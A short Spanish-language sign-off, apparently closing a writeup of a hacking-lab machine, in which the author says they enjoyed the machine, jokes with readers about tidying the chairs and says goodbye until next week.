Y nada, una experiencia más, me gusto mucho esta máquina, bastante largo el writeup (quizás), pero lo dicho, me gusto mucho el cómo quedo todo. Me voy retirando, por favor organicen las sillas antes de salir y nos vemos la próxima semana, besos y abrazos.

A romper de todooooo!